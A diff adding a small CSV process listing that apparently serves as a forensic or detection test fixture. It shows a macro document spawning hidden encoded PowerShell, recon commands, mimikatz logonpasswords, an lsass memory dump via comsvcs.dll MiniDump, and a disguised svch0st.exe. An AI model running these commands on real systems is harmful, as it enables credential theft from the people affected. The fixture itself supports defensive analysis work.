@@ -1,0 +1,11 @@
+PID,PPID,Name,CommandLine
+1100,4,System,
+3500,1100,winword.exe,"WINWORD.EXE /n C:\Users\alice\Downloads\invoice.docm"
+3550,3500,powershell.exe,"powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3A..."
+3560,3550,cmd.exe,"cmd.exe /c whoami && net user"
+3610,3550,mimikatz.exe,"mimikatz.exe sekurlsa::logonpasswords"
+4001,4,svch0st.exe,"C:\Users\Public\svch0st.exe -k netsvcs"
+4200,1100,lsass.exe,"C:\Windows\System32\lsass.exe"
+4300,1100,explorer.exe,"C:\Windows\explorer.exe"
+4450,3550,rundll32.exe,"rundll32.exe comsvcs.dll, MiniDump 512 C:\Users\Public\lsass.dmp"
+4600,1100,spoolsv.exe,"C:\Windows\System32\spoolsv.exe"
